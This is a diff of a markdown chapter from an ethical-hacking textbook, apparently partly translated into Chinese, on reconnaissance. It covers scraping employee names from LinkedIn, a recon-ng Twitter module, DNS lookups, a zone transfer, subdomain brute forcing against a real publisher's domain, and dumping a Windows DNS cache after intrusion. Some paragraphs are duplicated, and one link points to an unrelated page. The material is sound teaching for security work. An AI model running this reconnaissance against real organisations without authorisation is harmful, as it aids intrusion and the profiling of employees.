 Beyond jobs, though, we can use LinkedIn to harvest information about people. There are a couple of reasons to look up people. One is just to get some names and titles that you may use later. Another is that even if job descriptions don't have information about technology, when people post their job responsibilities, they very often do. You can also get details about their certifications. Someone with a load of Cisco certifications, for example, is probably employed at a company that has a lot of Cisco equipment. Don't overlook nontechnical roles either. Anyone may provide a little insight into what you may find in the organization. You may get information about telephone systems and document management systems that the company uses, even if the employee isn't an administrator.
 
-We will take a look at a tool called crosslinked.py here to do some searching for us.
+We will take a look at a tool called `crosslinked.py` here to do some searching for us.
 
-**CrossLinked Results from an Employee Search**
+## CrossLinked Results from an Employee Search
 
 ```
  $ git clone https://github.com/m8r0wn/crosslinked
@@ -3185,19 +3471,13 @@ We will take a look at a tool called crosslinked.py here to do some searching fo
  [*] 298 https://www.google.com/search?q=site:linkedin.com/in+"Wiley"&num=100&start=298 (200)
  [*] 298 https://www.google.com/search?q=site:linkedin.com/in+"Wiley"&num=100&start=298 (200)
  [*] 298 names collected
-  
-  
- 
 ```
 
-The results of the search are placed in a comma‑separated values file named names.csv. This is not a perfect utility, however, since it is not searching for employees at Wiley. Instead, you are getting everything that may have Wiley as part of the results, including people named Wiley. This includes people like a consultant named Calvin Wiley.
+The results of the search are placed in a comma‑separated values file named `names.csv`. This is not a perfect utility, however, since it is not searching for employees at Wiley. Instead, you are getting everything that may have Wiley as part of the results, including people named Wiley. This includes people like a consultant named Calvin Wiley.
 
-#### Twitter
+## Twitter
 
 Another common social networking site or service is Twitter. There is a lot posted to Twitter that can be of some use. Again, programmatic access to Twitter is useful. You can search using the regular interface, but it's sometimes helpful to be able to use other tools. To gain access to Twitter programmatically, you need to get an API key. This means you need to tell Twitter you are creating an application. You can easily tell Twitter you are creating an application without any special credentials through the Twitter developer's website. When you go through the process to create an application, what you are doing is creating identification information that your app needs to interact with the Twitter service. In Figure 4.10, you can see keys and access tokens for an app.
-
-
-
 
 ![FIGURE 4.10 Twitter keys and access tokens](img/c04f010.png)
 
@@ -3205,7 +3485,7 @@ Another common social networking site or service is Twitter. There is a lot post
 
 你可能会注意到在`Figure 4.10`中，应用名称为`recon-ng-me`。原因是我只创建该应用是为了获取 key 和 token，以便将其添加到`recon-ng`，这是一个用于侦察的工具，包含许多插件。有些插件需要 API key 或访问 token 才能与被查询的服务进行交互。这正是 Twitter 插件的情况。下面的代码中，你可以看到`recon-ng` 使用的 API key 列表以及 Twitter 的 API key 设置。在使用 key 之前，你需要在`recon-ng` 的市场中，使用`marketplace install recon/profiles-profiles/twitter_mentions` 将模块安装到`recon-ng`。
 
-**recon-ng Keys**
+### `recon-ng` Keys
 
 ```
 [recon-ng][default]> keys list
@@ -3239,7 +3519,9 @@ Another common social networking site or service is Twitter. There is a lot post
 
 现在我们已经设置好 Twitter 的 API key，就可以运行模块了。要运行模块，需要“加载”它，即使用`modules load`命令加载模块。加载后，需要设置来源。在我们的情况，来源是一个文本字符串，需要用引号括起来，告诉`recon-ng`我们使用文本字符串作为来源。这里期望的文本字符串是用户名。单词`recon`是随意选择的，结果却很有效。一旦完成这些步骤，只需运行模块即可。下面的代码展示了加载模块、设置来源并运行模块的过程。由于模块返回的结果较多，结果被截断以示用法示例。
 
-**使用 Twitter 模块在 recon-ng**
+### 使用 Twitter 模块在 `recon-ng`
+
+
 
 ```
 [recon-ng][default]> modules load recon/profiles-profiles/twitter_mentions
@@ -3315,9 +3597,6 @@ SOURCE => ‘recon’
 
 #### Job Sites
 
-
-
-
 -   [LinkedIn](https://www.linkedin.com) 作为信息来源。我们从 `LinkedIn` 可以获取到的信息之一是职位描述，这为我们提供了一些关于某些组织使用的技术的洞察。例如，Figure 4.12 显示了一个开放职位的部分资格要求。这是一份高级 DevOps 工程师的职位，发布在 `indeed.com`。虽然技术是作为示例列出的，但它们为我们提供了一些起点。你已经知道该公司使用关系型数据库。这并不奇怪，因为许多公司都在使用它们。但这告诉你，他们并没有使用 NoSQL，NoSQL 包括像 `MongoDB` 和 `Redis` 这样的技术。你也知道他们使用 `Amazon Web Services`。既然他们在寻找已在 AWS 上认证的人员，这点是确定的。
 
 ![FIGURE 4.12 Job listing with technologies](img/c04f012.png)
@@ -3336,9 +3615,9 @@ SOURCE => ‘recon’
 
 DNS 是一个层级系统，并且以多种方式呈层级。第一是我们使用的 FQDN。我可以用一个例子来说明。`www.labs.domain.com` 是一个 FQDN，因为它指向特定的主机或系统。阅读 FQDN 时最好从右向左阅读，因为 DNS 在将其转换为 IP 地址时也是如此。最初是顶级域名（TLD），它们包括 `.com`、`.org`、`.edu`，以及各个国家的域名（`.uk`、`.au`、`.ca`、`.sk`、`.us` 等）。后来加入了更多域名，但它们仍然是 TLD。它们被称为顶级域名，因为我们可以把 DNS 结构想象成一棵树，所有 TLD 位于树的顶端，其他内容则从这些 TLD 扩展出来。
 
-第二级域名是我们开始添加组织的地方。TLD 属于整个 Internet，由管理它们的组织负责，但它们并不“属于”任何单一组织，至少不像第二级域名那样可以明确归属。在我们的例子中，第二级域名是 *domain*。通常人们说的“域名”指的是第二级域名加上 TLD，例如 `domain.com`。
+第二级域名是我们开始添加组织的地方。TLD 属于整个 Internet，由管理它们的组织负责，但它们并不“属于”任何单一组织，至少不像第二级域名那样可以明确归属。在我们的例子中，第二级域名是 `domain`。通常人们说的“域名”指的是第二级域名加上 TLD，例如 `domain.com`。
 
-在第二级域名之下是子域名。每个域名可以拥有尽可能多层子域名，只要管理方愿意管理。我们例子中的子域名是 *labs*，它属于 `domain.com` 域。当我们在子域名、第二级域名和 TLD 上加上 *www*（主机名）时，就形成了完全限定域名（FQDN）。它之所以是“完全限定”，是因为它明确表明主机 *www* 所属的域，并且明确指出了该域内的具体主机。
+在第二级域名之下是子域名。每个域名可以拥有尽可能多层子域名，只要管理方愿意管理。我们例子中的子域名是 `labs`，它属于 `domain.com` 域。当我们在子域名、第二级域名和 TLD 上加上 `www`（主机名）时，就形成了完全限定域名（FQDN）。它之所以是“完全限定”，是因为它明确表明主机 `www` 所属的域，并且明确指出了该域内的具体主机。
 
 现在你已对 DNS 的命名结构及其用途有基本了解，接下来我们可以探讨如何利用 DNS 收集目标的信息。首先是名称查找。这包括名称查找的工作原理，随后我们会介绍一些可用的查找工具。之后，我们再讨论区域传输，这本质上是批量的名称查找。
 
@@ -3353,7 +3632,6 @@ TCP/IP 网络的名称解析器是 DNS 服务器，其他网络协议则使用�
 **FIGURE 4.13** DNS name resolution
 
 我们从标记为 A 的请求开始，它发送到名称解析器，即缓存 DNS。缓存 DNS 服务器检查其缓存，发现没有对应的 IP 地址，于是发起所谓的 *递归名称查询* 或 *递归名称解析*。之所以叫 *递归*，是因为它会产生多次越来越具体的请求，直至得到所需结果。缓存服务器首先需要查找根域名服务器的地址，依靠提示文件（hints file）中记录的根名字服务器的 IP 地址。对于我们的例子，缓存服务器需要确定用于 `.com` TLD 的服务器。找到后，它会发送请求 B，向根服务器请求 `domain.com` 域的名称服务器 IP 地址。
-
 
 根服务器包含它负责的所有属于该顶级域（TLD）的域的名称服务器详情。根服务器会向我们的缓存服务器返回 `domain.com` 的名称服务器的 IP 地址。我们在之前的 `whois` 查询中，查询的结尾会出现该域的名称服务器，因为名称服务器是与域一起存储的，这正是我们称之为 *递归查询* 的原因。我们不能直接向根服务器询问主机名的 IP 地址，必须让它指向下一步要询问的服务器。
 
@@ -3377,7 +3655,7 @@ TCP/IP 网络的名称解析器是 DNS 服务器，其他网络协议则使用�
 
 还有其他记录，其中一些与电子邮件安全有关，用于指示签名键以验证来自可信邮件服务器的消息。还有一条记录是 TXT 记录，用于存储不具备特定用途但可用于多种目的的文本条目。现在你已经了解了从 DNS 服务器获取 IP 地址的过程以及可以收集的其他信息，我们可以开始查看可用的工具。
 
-#### 使用 *host*
+#### 使用 `host`
 
 也许最易用的工具是 `host`。它在大多数类 Unix 系统（包括 Linux）中可用，但没有 Windows 版本。如果默认未安装，通常可以直接安装。使用方法非常简单：将想查询的主机名传给 `host`，即可得到响应。下面的代码示例展示了这一点：
 
@@ -3407,13 +3685,15 @@ $ host 208.215.179.132
 
 除了直接查询 IP 地址外，我们还可以使用不同于默认解析器的服务器。第二条命令中，我把 `4.2.2.1` 作为参数传入，这是一个任何人都可以使用的缓存服务器。该服务器由 BBN Planet 在 1990 年代创建，和 Google、Cloudflare 等类似服务一样，可供全 Internet 用户使用。由于它也是公开的缓存服务器，我们可以向它发送请求，它会按照前面描述的同样流程进行查询。
 
-从示例 `host 208.215.179.132` 可以看出，还可以通过 IP 地址查询 FQDN，即进行 *反向查找*。DNS 服务器可能会存储 FQDN 到 IP 的映射，从而实现这种反向查找。正如示例所示，同一个 IP 地址往往对应多个主机名，这在虚拟主机的场景中很常见 —  — 同一台 web 服务器可以根据请求中的主机名决定提供哪些内容。对该 IP 的查询返回了 197 条记录，但为了节省空间已被截断。
 
-#### 使用 *nslookup*
 
-另一个可用的工具是 `nslookup`。它的用法与 `host` 类似，例如直接运行 `nslookup www.sybex.com` 即可得到结果。`nslookup` 的优势在于可以在同一个会话中发出多条请求，而不必每次都重新启动程序。运行 `nslookup` 而不加参数时，会进入一个交互式 shell，在此期间你可以随时发送查询。下面的代码展示了一个 `nslookup` 会话：
+从示例`host 208.215.179.132`可以看出，还可以通过 IP 地址查询 FQDN，即进行*反向查找*。DNS 服务器可能会存储 FQDN 到 IP 的映射，从而实现这种反向查找。正如示例所示，同一个 IP 地址往往对应多个主机名，这在虚拟主机的场景中很常见——同一台 web 服务器可以根据请求中的主机名决定提供哪些内容。对该 IP 的查询返回了 197 条记录，但为了节省空间已被截断。
 
-**使用 `nslookup` 进行名称解析**
+### 使用`nslookup`
+
+另一个可用的工具是`nslookup`。它的用法与`host`类似，例如直接运行`nslookup www.sybex.com`即可得到结果。`nslookup`的优势在于可以在同一个会话中发出多条请求，而不必每次都重新启动程序。运行`nslookup`而不加参数时，会进入一个交互式 shell，在此期间你可以随时发送查询。下面的代码展示了一个`nslookup`会话：
+
+**使用`nslookup`进行名称解析**
 
 ```
 $ nslookup
@@ -3421,89 +3701,81 @@ $ nslookup
 > sybex.com
 Server:        192.168.86.1
 Address:    192.168.86.1#53
-  
- 
 ```
 
 **非权威答案：**
 
 ```
- sybex.com    nameserver = jws-edcp.wiley.com.
- sybex.com    nameserver = ns.wiley.co.uk.
- sybex.com    nameserver = ns2.wiley.co.uk.
- sybex.com    nameserver = sg-ns01.wiley.com.
- sybex.com    nameserver = bri-ns01.wiley.com.
- sybex.com    nameserver = ns.wileypub.com.
-  
- Authoritative answers can be found from:
- > set type=A
- > server ns.wileypub.com.
- Default server: ns.wileypub.com.
- Address: 12.165.240.53#53
- > www.sybex.com
- Server:        ns.wileypub.com.
- Address:    12.165.240.53#53
-  
- Name:    www.sybex.com
- Address: 208.215.179.132
- 
+sybex.com    nameserver = jws-edcp.wiley.com.
+sybex.com    nameserver = ns.wiley.co.uk.
+sybex.com    nameserver = ns2.wiley.co.uk.
+sybex.com    nameserver = sg-ns01.wiley.com.
+sybex.com    nameserver = bri-ns01.wiley.com.
+sybex.com    nameserver = ns.wileypub.com.
+
+Authoritative answers can be found from:
+> set type=A
+> server ns.wileypub.com.
+Default server: ns.wileypub.com.
+Address: 12.165.240.53#53
+> www.sybex.com
+Server:        ns.wileypub.com.
+Address:    12.165.240.53#53
+
+Name:    www.sybex.com
+Address: 208.215.179.132
 ```
 
-除了直接根据 FQDN 查询 IP，我还使用了资源记录。虽然 DNS 支持多种记录类型，但最常见的是地址（A）记录。当看到 `set type=ns` 时，我让 `nslookup` 发送后续请求以获取名称服务器（NS）记录，这将告诉我们该域的权威名称服务器。获取 NS 列表后，我将查询目标设置为其中一个 NS，这意味着 `nslookup` 直接向权威服务器发送 DNS 请求，无需进行递归查找，因为该服务器已经拥有所需信息。
+除了直接根据 FQDN 查询 IP，我还使用了资源记录。虽然 DNS 支持多种记录类型，但最常见的是地址（A）记录。当看到`set type=ns`时，我让`nslookup`发送后续请求以获取名称服务器（NS）记录，这将告诉我们该域的权威名称服务器。获取 NS 列表后，我将查询目标设置为其中一个 NS，这意味着`nslookup`直接向权威服务器发送 DNS 请求，无需进行递归查找，因为该服务器已经拥有所需信息。
 
+`dig`是另一个用于名称解析的实用程序。它同样支持我们之前做的所有操作，这意味着我们可以指定不同的名称服务器，并请求不同类型的资源记录。下面的示例展示了`dig`的用法。命令行中包含了所有请求信息，包括资源记录类型、请求内容以及`dig`应该发送请求的服务器。
 
-
-
-`dig` 是另一个用于名称解析的实用程序。它同样支持我们之前做的所有操作，这意味着我们可以指定不同的名称服务器，并请求不同类型的资源记录。下面的示例展示了 `dig` 的用法。命令行中包含了所有请求信息，包括资源记录类型、请求内容以及 `dig` 应该发送请求的服务器。
-
-`# Using `dig` for DNS Lookups`
+**使用`dig`进行 DNS 查找**
 
 ```
-$ `dig` mx wiley.com @`car-ibextdns-01.wiley.com`
-  
+$ dig mx wiley.com @car-ibextdns-01.wiley.com
+
 ; <<>> DiG 9.10.6 <<>> mx wiley.com @car-ibextdns-01.wiley.com
-; <<>> DiG 9.10.6 <<>> mx wiley.com @car-ibextdns-01.wiley.com
- ;; global options: +cmd
- ;; Got answer: 
- ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47684
- ;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
- ;; WARNING: recursion requested but not available
-  
- ;; OPT PSEUDOSECTION:
- ; EDNS: version: 0, flags:; udp: 1220
- ;; QUESTION SECTION:
- ;wiley.com.                IN    MX
-  
- ;; ANSWER SECTION:
- wiley.com.          900    IN    MX      10 mxa-0053b401.gslb.pphosted.com.
- wiley.com.          900    IN    MX      10 mxb-0053b401.gslb.pphosted.com.
-  
- ;; Query time: 62 msec
- ;; SERVER: 63.97.119.2#53(63.97.119.2)
- ;; WHEN: Tue Feb 28 17:13:30 EST 2023
- ;; MSG SIZE  rcvd: 110
- 
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47684
+;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1220
+;; QUESTION SECTION:
+;wiley.com.                IN    MX
+
+;; ANSWER SECTION:
+wiley.com.          900    IN    MX      10 mxa-0053b401.gslb.pphosted.com.
+wiley.com.          900    IN    MX      10 mxb-0053b401.gslb.pphosted.com.
+
+;; Query time: 62 msec
+;; SERVER: 63.97.119.2#53(63.97.119.2)
+;; WHEN: Tue Feb 28 17:13:30 EST 2023
+;; MSG SIZE  rcvd: 110
 ```
 
-响应比以往任何时候都更加详细。首先，我们可以看到 `dig` 在运行时使用的参数。这些参数可以按需更改。参数之后，你可以看到查询部分，这使得请求内容非常清晰。你可以将其与命令行中指定的内容进行对比，以防止任何混淆。最后，我们得到结果。
+响应比以往任何时候都更加详细。首先，我们可以看到`dig`在运行时使用的参数。这些参数可以按需更改。参数之后，你可以看到查询部分，这使得请求内容非常清晰。你可以将其与命令行中指定的内容进行对比，以防止任何混淆。最后，我们得到结果。
 
 在此示例中，类型是 MX，即邮件交换记录。DNS 服务器会返回为该域名配置的所有邮件服务器列表。当你想向某人发送邮件时，你的邮件服务器会发出 DNS 请求，询问应该将邮件发送到哪个邮件服务器。邮件服务器以数字列出，最小的数字是首选服务器。如果出于任何原因无法到达该服务器，则会转到下一个，直到没有更多服务器可用并必须失败消息。
 
-使用 `dig`，我们可以像之前使用 `host` 和 `nslookup` 一样在命令行上指定想要的资源记录类型。在我们的命令行 (`dig mx wiley.com @` `car-ibextdns-01.wiley.com`) 中，`mx` 是被请求的资源记录类型，但也可以是 A、NS、PTR 等。如果我们想从 FQDN 获取 IP 地址，也可以使用 PTR。在请求类型之后是请求本身。由于我们查找的是邮件交换记录，这里是域名；不过你也可以提供完整的 FQDN，系统会返回该 FQDN 中最后一个域的邮件交换记录。最后，我们使用 `@` 标识要查询的服务器。
+使用`dig`，我们可以像之前使用`host`和`nslookup`一样在命令行上指定想要的资源记录类型。在我们的命令行（`dig mx wiley.com @car-ibextdns-01.wiley.com`）中，`mx`是被请求的资源记录类型，但也可以是 A、NS、PTR 等。如果我们想从 FQDN 获取 IP 地址，也可以使用 PTR。在请求类型之后是请求本身。由于我们查找的是邮件交换记录，这里是域名；不过你也可以提供完整的 FQDN，系统会返回该 FQDN 中最后一个域的邮件交换记录。最后，我们使用`@`标识要查询的服务器。
 
 ### 区域传输
 
-单个请求已经足够，但它假设你已经知道一些信息。通常，应用程序会请求基于 FQDN 的 IP 地址信息，以便正常工作。在我们的情形中，作为伦理黑客，我们有时需要获取属于某个域的所有主机名。这可以通过所谓的 *区域传输* 来实现。区域传输是合法的，用于在多个权威名称服务器之间保持同步。你可能拥有一个域的主权限名称服务器，以及多个从属服务器。从属服务器会向主服务器发起区域传输请求，以同步记录。
+单个请求已经足够，但它假设你已经知道一些信息。通常，应用程序会请求基于 FQDN 的 IP 地址信息，以便正常工作。在我们的情形中，作为伦理黑客，我们有时需要获取属于某个域的所有主机名。这可以通过所谓的*区域传输*来实现。区域传输是合法的，用于在多个权威名称服务器之间保持同步。你可能拥有一个域的主权限名称服务器，以及多个从属服务器。从属服务器会向主服务器发起区域传输请求，以同步记录。
 
-我们可以利用这一能力，理论上请求域内的所有记录。因此，出现了两种情况。首先，大多数域不会允许除已配置的从属名称服务器之外的任何人进行区域传输。其次，许多公司使用所谓的 *分区 DNS*，即外部世界使用授权的名称服务器地址来解析外部可访问的主机（如 Web 服务器和邮件服务器）。企业内部的系统则使用公司内部的解析器，该解析器被配置为域的权威。这意味着内部网络可以解析和连接到外部不可见的许多系统。
+我们可以利用这一能力，理论上请求域内的所有记录。因此，出现了两种情况。首先，大多数域不会允许除已配置的从属名称服务器之外的任何人进行区域传输。其次，许多公司使用所谓的*分区 DNS*，即外部世界使用授权的名称服务器地址来解析外部可访问的主机（如 Web 服务器和邮件服务器）。企业内部的系统则使用公司内部的解析器，该解析器被配置为域的权威。这意味着内部网络可以解析和连接到外部不可见的许多系统。
 
-要发起区域传输请求，可以使用我们已经熟悉的工具，或者使用其他工具。例如，如果想使用 `dig` 尝试区域传输，请求类型为 `axfr`。下面的示例展示了使用 `dig` 进行区域传输的过程。
+要发起区域传输请求，可以使用我们已经熟悉的工具，或者使用其他工具。例如，如果想使用`dig`尝试区域传输，请求类型为`axfr`。下面的示例展示了使用`dig`进行区域传输的过程。
 
-`# Zone Transfer Using `dig`**
+**使用`dig`进行区域传输**
 
 ```
-$ `dig` axfr domain.com @192.168.86.51
-  
+$ dig axfr domain.com @192.168.86.51
+
 ; <<>> DiG 9.10.6 <<>> axfr domain.com @192.168.86.51
 ;; global options: +cmd
 domain.com.        86000    IN    SOA    ns.domain.com. root.domain.com. 1 604800 86400 24129200 604800
@@ -3519,53 +3791,143 @@ domain.com.        86000    IN    SOA    ns.domain.com. root.domain.com. 1 60480
 ;; SERVER: 192.168.86.51#53(192.168.86.51)
 ;; WHEN: Thu Jul 05 10:15:27 MDT 2018
 ;; XFR size: 9 records (messages 1, bytes 243)
- 
 ```
 
 ### 暴力破解
 
-由于区域传输通常被禁止，你可能需要依赖不太优雅的解决方案来获取目标信息。幸运的是，有一些工具可以帮助你。其中一个是 `dnsrecon`，它可以用于提取常见的 DNS 资源记录，并通过提供的字典进行重复请求以识别主机名。下面的示例展示了 `dnsrecon` 进行暴力破解的过程。字典中包含了若干可能的主机名，这些名称会被附加到提供的域名前，生成完整的 FQDN 并进行检查。以下是扫描结果的片段。
+由于区域传输通常被禁止，你可能需要依赖不太优雅的解决方案来获取目标信息。幸运的是，有一些工具可以帮助你。其中一个是`dnsrecon`，它可以用于提取常见的 DNS 资源记录，并通过提供的字典进行重复请求以识别主机名。下面的示例展示了`dnsrecon`进行暴力破解的过程。字典中包含了若干可能的主机名，这些名称会被附加到提供的域名前，生成完整的 FQDN 并进行检查。以下是扫描结果的片段。
 
-`# Using `dnsrecon` to Acquire Hostnames`
+**使用`dnsrecon`获取主机名**
 
 ```
-$ `dnsrecon` -d wiley.com -D /usr/share/wordlists/dnsmap.txt -t brt
-[*]` Performing host and subdomain brute force against wiley.com
-[*]` A act.wiley.com 209.172.193.49
-[*]` A adc.wiley.com 192.168.5.1
-[*]` A ags.wiley.com 209.172.193.49
-[*]` A api.wiley.com 209.172.192.180
-[*]` A bcs.wiley.com 209.172.193.216
-[*]` CNAME bpa.wiley.com internal-bpa-private-app-prod-elb-405571586
+$ dnsrecon -d wiley.com -D /usr/share/wordlists/dnsmap.txt -t brt
+[*] Performing host and subdomain brute force against wiley.com
+[*] A act.wiley.com 209.172.193.49
+[*] A adc.wiley.com 192.168.5.1
+[*] A ags.wiley.com 209.172.193.49
+[*] A api.wiley.com 209.172.192.180
+[*] A bcs.wiley.com 209.172.193.216
+[*] CNAME bpa.wiley.com internal-bpa-private-app-prod-elb-405571586
 .us-east-1.elb.amazonaws.com
-[*]` A internal-bpa-private-app-prod-elb-405571586.us-east-1.elb.amazonaws
+[*] A internal-bpa-private-app-prod-elb-405571586.us-east-1.elb.amazonaws
 .com 10.223.11.111
-[*]` A internal-bpa-private-app-prod-elb-405571586.us-east-1.elb.amazonaws
+[*] A internal-bpa-private-app-prod-elb-405571586.us-east-1.elb.amazonaws
 .com 10.223.139.133
-[*]` A bpm.wiley.com 10.6.1.241
-[*]` A bps.wiley.com 10.6.2.91
-[*]` A cct.wiley.com 209.172.194.98
-[*]` CNAME cec.wiley.com d1hsh8hpdo3jj3.cloudfront.net 
- 
+[*] A bpm.wiley.com 10.6.1.241
+[*] A bps.wiley.com 10.6.2.91
+[*] A cct.wiley.com 209.172.194.98
+[*] CNAME cec.wiley.com d1hsh8hpdo3jj3.cloudfront.net
 ```
 
 在某些情况下，查询 IP 地址会返回别名。在输出中，这些以 CNAME 形式出现。CNAME 指向另一个主机名或完整的 FQDN，该名称会继续解析直至得到 IP 地址。可能存在多层 CNAME 需要依次解析。部分 IP 地址是私有的，而其他则是公开的。这些公开的 IP 地址可以进一步追踪。
 
 ### 被动 DNS
 
+- [被动 DNS 侦察](https://wiki.example.org/feynmans_learning_method)是利用本地系统中缓存的 DNS 条目进行的一种技术。
+
+每次在某些系统上执行 DNS 查找时，结果会被本地缓存。这种缓存可以避免下次访问相同主机时再发送网络请求。条目在 DNS 中的存活时间（TTL）由其生存期（time-to-live）字段决定，该字段从权威记录（SOA）开始。SOA 记录指示域记录本身的过期时间，告诉任何查询该域的人何时需要再次检查权威域名服务器。每个域都有关联的 NS 记录，指明需要询问哪些服务器以获取该域的答案。除非记录已在本地缓存（无论是客户端本身还是客户端询问的本地缓存服务器），否则应始终向这些权威服务器查询。
+
+除了 SOA 记录提供的域级超时长度外，DNS 中每条单独记录都可以拥有自己的生存期（TTL）值。该值表明系统可以缓存结果的时间，然后需要再次向权威 DNS 服务器查询以确认值未变。根据 DNS 规范，不必等到条目生命周期结束才刷新缓存，而是使用小于完整 TTL 的值。TTL 仍然指导本地缓存中保留值的时长。
+
+Windows 系统会缓存这些值，并且可以导出缓存内容，如下面的片段所示。要在 Windows 系统上导出缓存，可使用命令行工具，例如传统的命令行或基于 PowerShell 的命令`ipconfig /displaydns`。
+
+**使用 ipconfig**
 
 
 
--   [被动 DNS 侦察](https://wiki.example.org/feynmans_learning_method)是利用本地系统中缓存的 DNS 条目进行的一种技术。
+```
+PS C:\Users\Ric Messier> ipconfig /displaydns
+ 
+Windows IP Configuration
+ 
+vortex.data.microsoft.com
+----------------------------------------
+Record Name . . . . . : vortex.data.microsoft.com
+Record Type . . . . . : 5
+Time To Live  . . . . : 24
+Data Length . . . . . : 8
+Section . . . . . . . : Answer
+CNAME Record  . . . . : asimov.vortex.data.trafficmanager.net
+ 
+ 
+Record Name . . . . . : asimov.vortex.data.trafficmanager.net
+Record Type . . . . . : 1
+Time To Live  . . . . : 24
+Data Length . . . . . : 4
+Section . . . . . . . : Answer
+A (Host) Record . . . : 64.4.54.254
+ 
+ 
+array511.prod.do.dsp.mp.microsoft.com
+----------------------------------------
+Record Name . . . . . : array511.prod.do.dsp.mp.microsoft.com
+Record Type . . . . . : 1
+Time To Live  . . . . : 1489
+Data Length . . . . . : 4
+Section . . . . . . . : Answer
+A (Host) Record . . . : 52.184.213.21
+ 
+1.0.0.127.in-addr.arpa
+----------------------------------------
+Record Name . . . . . : 1.0.0.127.in-addr.arpa.
+Record Type . . . . . : 12
+Time To Live  . . . . : 541542
+Data Length . . . . . : 8
+Section . . . . . . . : Answer
+PTR Record  . . . . . : kubernetes.docker.internal
+ 
+ 
+download.visualstudio.microsoft.com
+----------------------------------------
+Record Name . . . . . : download.visualstudio.microsoft.com
+Record Type . . . . . : 5
+Time To Live  . . . . : 33
+Data Length . . . . . : 8
+Section . . . . . . . : Answer
+CNAME Record  . . . . : 2-01-5830-0005.cdx.cedexis.net
+ 
+ 
+Record Name . . . . . : 2-01-5830-0005.cdx.cedexis.net
+Record Type . . . . . : 5
+Time To Live  . . . . : 33
+Data Length . . . . . : 8
+Section . . . . . . . : Answer
+CNAME Record  . . . . : 4316b.wpc.azureedge.net
+ 
+ 
+Record Name . . . . . : 4316b.wpc.azureedge.net
+Record Type . . . . . : 5
+Time To Live  . . . . : 33
+Data Length . . . . . : 8
+Section . . . . . . . : Answer
+CNAME Record  . . . . : cs10.wpc.v0cdn.net
+ 
+ 
+Record Name . . . . . : cs10.wpc.v0cdn.net
+Record Type . . . . . : 28
+Time To Live  . . . . : 33
+Data Length . . . . . : 16
+Section . . . . . . . : Answer
+AAAA Record . . . . . : 2606:2800:11f:7de:d31:7db:168f:1225
+ 
+array513.prod.do.dsp.mp.microsoft.com
+----------------------------------------
+Record Name . . . . . : array513.prod.do.dsp.mp.microsoft.com
+Record Type . . . . . : 1
+Time To Live  . . . . : 1202
+Data Length . . . . . : 4
+Section . . . . . . . : Answer
+A (Host) Record . . . : 52.184.214.53
+```
 
-每次在某些系统上执行 DNS 查找时，结果会被本地缓存。这种缓存可以避免下次访问相同主机时再发送网络请求。条目在 DNS 中的存活时间（TTL）由其生存期（time‑to‑live）字段决定，该字段从权威记录（SOA）开始。SOA 记录指示域记录本身的过期时间，告诉任何查询该域的人何时需要再次检查权威域名服务器。每个域都有关联的 NS 记录，指明需要询问哪些服务器以获取该域的答案。除非记录已在本地缓存（无论是客户端本身还是客户端询问的本地缓存服务器），否则应始终向这些权威服务器查询。
+在实践中，侦察分为两个不同的阶段。虽然在发动攻击时会大量关注信息收集，但获取利用后也会进行大量侦察。你可以从外部以及内部进行侦察。一旦你进入内部网络，某些侦察工作会变得更容易，或者至少我们会打开其他侦察途径。利用本地系统中缓存的 DNS 条目的技术被称为 `passive` DNS 侦察。
+
+每次在某些系统上执行 DNS 查找时，结果会被本地缓存。这种缓存可以避免下次访问相同主机时再发送网络请求。条目的存活时间（TTL）由 DNS 条目中的生存期（time‑to‑live）字段决定，该字段从权威记录（SOA）开始。SOA 记录指示域记录本身的过期时间，告诉任何查询该域的人何时需要再次检查权威域名服务器。每个域都有关联的 NS 记录，指明需要询问哪些服务器以获取该域的答案。除非记录已在本地缓存（无论是客户端本身还是客户端询问的本地缓存服务器），否则应始终向这些权威服务器查询。
 
 除了 SOA 记录提供的域级超时长度外，DNS 中每条单独记录都可以拥有自己的生存期（TTL）值。该值表明系统可以缓存结果的时间，然后需要再次向权威 DNS 服务器查询以确认值未变。根据 DNS 规范，不必等到条目生命周期结束才刷新缓存，而是使用小于完整 TTL 的值。TTL 仍然指导本地缓存中保留值的时长。
 
 Windows 系统会缓存这些值，并且可以导出缓存内容，如下面的片段所示。要在 Windows 系统上导出缓存，可使用命令行工具，例如传统的命令行或基于 PowerShell 的命令 `ipconfig /displaydns`。
 
-**使用 ipconfig**
-
 ```
 PS C:\Users\Ric Messier> ipconfig /displaydns
  
@@ -3651,152 +4013,94 @@ Section . . . . . . . : Answer
 A (Host) Record . . . : 52.184.214.53
 ```
 
--   [在实践中，侦察分为两个不同的阶段。虽然在发动攻击时会大量关注信息收集，但获取利用后也会进行大量侦察。你可以从外部以及内部进行侦察。一旦你进入内部网络，某些侦察工作会变得更容易，或者至少我们会打开其他侦察途径。利用本地系统中缓存的 DNS 条目的技术被称为 `passive` DNS 侦察。]
+在实践中，外部侦察这种技术可能用处不大。一旦你获得内部网络的访问权限，你就想了解所有系统和 IP 地址。从外部，你可以查询公开来源获取组织可能拥有的地址块信息。而在内部，它们通常使用私有地址，公开记录中很少有关于这些地址块的信息，除非你偶然获得网络管理系统的访问权限，该系统记录所有地址块。相反，你可以在你拥有访问权限的系统上导出 DNS 缓存。导出的内容不仅包含主机名，还包含这些主机名对应的 IP 地址。如果缓存中出现大量公司域名的条目，你很可能正在查看内部 DNS 记录。另一种表明你拥有内部地址的线索是看到以 `.local` 结尾的条目，这是一个不能在 Internet 上使用的顶级域，常被用作内部 DNS 实现的顶级域（即完全限定域名的最后部分，包含主机名和域名）。
 
--   [每次在某些系统上执行 DNS 查找时，结果会被本地缓存。这种缓存可以避免下次访问相同主机时再发送网络请求。条目的存活时间（TTL）由 DNS 条目中的生存期（time‑to‑live）字段决定，该字段从权威记录（SOA）开始。SOA 记录指示域记录本身的过期时间，告诉任何查询该域的人何时需要再次检查权威域名服务器。每个域都有关联的 NS 记录，指明需要询问哪些服务器以获取该域的答案。除非记录已在本地缓存（无论是客户端本身还是客户端询问的本地缓存服务器），否则应始终向这些权威服务器查询。]
